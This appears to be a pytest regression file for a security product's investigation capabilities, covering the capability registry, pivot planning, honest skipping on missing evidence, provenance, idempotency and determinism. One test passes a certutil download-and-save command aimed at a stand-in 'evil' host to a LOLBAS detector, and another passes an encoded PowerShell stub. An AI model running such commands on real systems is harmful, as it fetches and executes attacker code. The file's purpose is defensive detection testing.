"""Round 32 · NivXRay XDR · Capability Fabric v1 regression.

Owner-locked acceptance criteria (§24 of the Round 32 directive):
  * 12 built-in capabilities registered, all cap-full.
  * Every capability declares a category, investigation question,
    and evidence requirements.
  * Selector honestly skips when evidence is INSUFFICIENT — never
    fabricates a finding to fill the gap.
  * Real engines (LOLBAS · smart_decoder · IOC extractor) are
    reused, not duplicated.
  * Findings evidence-anchored; provenance preserved through the loop.
  * Idempotent: second tick against same fingerprint produces zero
    new OK executions.
  * Deterministic: two ticks against the same evidence produce the
    same finding ids.
"""
from __future__ import annotations
import asyncio, os, uuid
import pytest
from dotenv import load_dotenv
load_dotenv("/app/backend/.env")
from motor.motor_asyncio import AsyncIOMotorClient

from detection_content.xdr_pipeline import process_event_through_pipeline
from detection_content.collector_runtime import GOLDEN_SNORT_EVENT
from services.investigator import InvestigatorService
from services.investigator.capabilities import all_capabilities
from services.investigator.planner import (
    plan_pivots, BASELINE_CAPABILITIES, GAP_CAPABILITY_MAP,
    registry_descriptor,
)
from services.iue.service import IUEService


@pytest.fixture(scope="module")
def loop():
    lp = asyncio.new_event_loop()
    yield lp
    lp.close()


@pytest.fixture(scope="module")
def db(loop):
    c = AsyncIOMotorClient(os.environ["MONGO_URL"])
    yield c[os.environ.get("DB_NAME", "test_database")]
    c.close()


def _run(loop, coro):
    return loop.run_until_complete(coro)


@pytest.fixture(scope="module")
def incident_id(loop, db):
    r = _run(loop, process_event_through_pipeline(
        db, dict(GOLDEN_SNORT_EVENT), str(uuid.uuid4()),
        integration_id="integration-snort-ref",
        collector_id="collector-snort-ref"))
    inc = r.get("incident") or {}
    assert inc.get("created"), f"snort-golden pipeline failed: {r}"
    return inc["incident_id"]


# ── 1 · Registry surface ────────────────────────────────────────────
def test_registry_registers_all_expected_capabilities():
    ids = set(all_capabilities().keys())
    expected = {
        # Historical / correlation / MITRE / detection
        "historical_correlation", "correlation", "mitre_expansion",
        "detection_intel",
        # Endpoint
        "process_ancestry", "commandline_decode", "lolbas_lookup",
        # Network / DNS / IOC / File / Identity
        "network_pivot", "dns_pivot", "ioc_pivot",
        "file_reputation", "identity_pivot",
    }
    missing = expected - ids
    assert not missing, f"registry missing capabilities: {missing}"
    # All built-in capabilities in Round 32 are cap-full (no more stubs).
    for cap in all_capabilities().values():
        assert cap.availability == "cap-full", (
            f"{cap.id} must be cap-full in Round 32 (was {cap.availability})")


def test_every_capability_declares_contract_fields():
    for cap in all_capabilities().values():
        assert cap.id and cap.name and cap.engine
        assert cap.category, f"{cap.id} missing category"
        assert cap.investigation_question, (
            f"{cap.id} missing investigation_question")
        assert isinstance(cap.evidence_requirements, tuple)
        assert cap.version


def test_registry_descriptor_shape():
    descs = registry_descriptor()
    assert len(descs) == len(all_capabilities())
    d0 = descs[0]
    for k in ("id", "name", "engine", "category", "investigation_question",
                "evidence_requirements", "availability"):
        assert k in d0


# ── 2 · Planner emits baseline + gap pivots ─────────────────────────
def test_planner_covers_baseline_and_gap_capabilities(loop, db, incident_id):
    understanding = _run(loop, IUEService.latest_valid(db, incident_id))
    pivots = plan_pivots(understanding)
    cap_ids = {p.capability for p in pivots}
    # Every baseline capability must appear.
    for cap in BASELINE_CAPABILITIES:
        assert cap in cap_ids, f"baseline capability {cap} missing from plan"
    # Every mapped gap for the incident's actual gaps must appear.
    for gap in understanding.artifacts.gaps.gaps:
        for cap in GAP_CAPABILITY_MAP.get(gap.key, ()):
            assert cap in cap_ids, (
                f"gap {gap.key} mapped to {cap} but planner did not emit it")


def test_planner_is_deterministic(loop, db, incident_id):
    understanding = _run(loop, IUEService.latest_valid(db, incident_id))
    a = plan_pivots(understanding)
    b = plan_pivots(understanding)
    assert [p.pivot_id for p in a] == [p.pivot_id for p in b]
    assert [p.capability for p in a] == [p.capability for p in b]


# ── 3 · Pipeline auto-kick executes multiple capabilities ───────────
def test_pipeline_kicks_multi_capability_investigation(loop, db, incident_id):
    execs = _run(loop, InvestigatorService.get_executions(db, incident_id))
    ok_by_cap = {e["capability"] for e in execs if e["status"] == "OK"}
    # These four run against snort-golden's actual evidence: network
    # entities + signature + veee verdict + IOC surface.
    for expected in ("historical_correlation", "mitre_expansion",
                        "detection_intel", "network_pivot", "ioc_pivot"):
        assert expected in ok_by_cap, (
            f"capability {expected} must have executed successfully "
            f"(got OK caps: {sorted(ok_by_cap)})")
    # correlation runs only when ice_matches are present; when they
    # are not, it must honestly SKIP (never fabricate). Verify one or
    # the other, but not fabricated.
    corr_rows = [e for e in execs if e["capability"] == "correlation"]
    assert corr_rows, "correlation capability must at least be attempted"
    for e in corr_rows:
        assert e["status"] in ("OK", "SKIPPED_OUT_OF_SCOPE"), (
            f"correlation must run or skip honestly, got {e['status']}")


# ── 4 · Endpoint capabilities honestly skip on network-only alert ───
def test_endpoint_capabilities_honestly_skipped(loop, db, incident_id):
    """Snort-golden carries no process telemetry — endpoint
    capabilities MUST honestly skip with SKIPPED_OUT_OF_SCOPE,
    never fabricate a process-lineage finding."""
    execs = _run(loop, InvestigatorService.get_executions(db, incident_id))
    for cap in ("process_ancestry", "commandline_decode", "lolbas_lookup",
                    "identity_pivot", "file_reputation"):
        rows = [e for e in execs if e["capability"] == cap]
        assert rows, f"expected an execution row for {cap}"
        # All of these must be skipped as OUT_OF_SCOPE (no endpoint/id evidence).
        for e in rows:
            assert e["status"] == "SKIPPED_OUT_OF_SCOPE", (
                f"{cap} must SKIPPED_OUT_OF_SCOPE for network-only "
                f"pipeline, got {e['status']} (reason: {e['reason']})")
            assert "evidence" in (e.get("reason") or "").lower()


# ── 5 · Real capability outputs — LOLBAS reused, not duplicated ─────
def test_lolbas_uses_existing_engine():
    """Sanity check that the LOLBAS capability reuses the real
    NivXRay ``lolbas.scan_lolbas`` module rather than duplicating a
    catalog."""
    from services.investigator.capabilities.endpoint import LolbasLookupCapability
    import lolbas as real_lolbas
    cap = LolbasLookupCapability()
    # Direct scan through the real engine on a canonical LOLBAS argv.
    hits = real_lolbas.scan_lolbas("certutil.exe -urlcache -f http://evil/x.exe out.exe")
    assert hits, "sanity: real lolbas engine must match certutil -urlcache"
    assert cap.engine.startswith("nivxray::investigator::lolbas")


def test_commandline_capability_reuses_smart_decoder():
    """Verify the capability wires the real smart_decoder module."""
    from services.investigator.capabilities.endpoint import CommandLineDecodeCapability
    from smart_decoder import smart_decode
    out = smart_decode("powershell -e AABBCC==")
    assert isinstance(out, dict)


# ── 6 · Findings carry provenance + evidence anchoring ──────────────
def test_findings_are_evidence_anchored(loop, db, incident_id):
    findings = _run(loop, InvestigatorService.get_findings(db, incident_id))
    assert len(findings) > 0
    for f in findings:
        assert f["finding_id"].startswith("fnd_")
        assert f["execution_id"], f"finding {f['finding_id']} missing execution_id"
        assert f["capability"]
        assert f["reasoning"]
        # State must obey §27 grammar.
        assert f["state"] in {"OBSERVED", "SUPPORTED", "CORRELATED",
                                    "INFERRED", "HYPOTHESIS",
                                    "NOT_OBSERVED", "UNKNOWN", "CONTRADICTED"}


# ── 7 · Sufficiency stored in execution provenance ──────────────────
def test_execution_provenance_records_sufficiency(loop, db, incident_id):
    execs = _run(loop, InvestigatorService.get_executions(db, incident_id))
    have = 0
    for e in execs:
        prov = e.get("provenance") or {}
        if "evidence_sufficiency" in prov:
            have += 1
            assert prov["evidence_sufficiency"] in (
                "SUFFICIENT", "PARTIAL", "INSUFFICIENT", "NOT_APPLICABLE")
    assert have > 0, "at least some executions must record sufficiency"


# ── 8 · Idempotency across ticks ────────────────────────────────────
def test_second_tick_produces_no_new_ok_executions(loop, db, incident_id):
    before = _run(loop, InvestigatorService.get_executions(db, incident_id))
    _run(loop, InvestigatorService.tick(db, incident_id))
    after = _run(loop, InvestigatorService.get_executions(db, incident_id))
    ok_before = [e for e in before if e["status"] == "OK"]
    ok_after = [e for e in after if e["status"] == "OK"]
    assert len(ok_before) == len(ok_after), (
        f"idempotency violated: OK went {len(ok_before)}→{len(ok_after)}")


# ── 9 · Determinism · same evidence → same findings ─────────────────
def test_finding_ids_deterministic_across_ticks(loop, db, incident_id):
    before = _run(loop, InvestigatorService.get_findings(db, incident_id))
    _run(loop, InvestigatorService.tick(db, incident_id))
    after = _run(loop, InvestigatorService.get_findings(db, incident_id))
    ids_before = sorted(f["finding_id"] for f in before)
    ids_after = sorted(f["finding_id"] for f in after)
    assert ids_before == ids_after, "finding ids drifted across ticks"


# ── 10 · Investigation converges ────────────────────────────────────
def test_investigation_converges(loop, db, incident_id):
    state = _run(loop, InvestigatorService.get_state(db, incident_id))
    assert state.state == "CONVERGED"
    assert state.converged_at
    assert state.convergence_reason


# ── 11 · Activity feed carries capability + result columns ─────────
def test_activity_feed_carries_capability_and_result(loop, db, incident_id):
    activity = _run(loop, InvestigatorService.get_activity(db, incident_id))
    exec_entries = [a for a in activity if a["kind"] == "EXECUTION"]
    assert exec_entries, "activity feed must include EXECUTION entries"
    for a in exec_entries:
        assert a["capability"]
        assert a["engine"]
        assert a["result"]


# ── 12 · Verdict Engine boundary unchanged ──────────────────────────
def test_verdict_untouched_by_capability_fabric(loop, db, incident_id):
    doc = _run(loop, db["workspace_cases"].find_one(
        {"id": incident_id},
        {"_id": 0, "verdict_stage2": 1, "verdict_card": 1}))
    if doc.get("verdict_card"):
        assert doc["verdict_card"].get("verdict") in (
            "malicious", "suspicious", "benign", None)
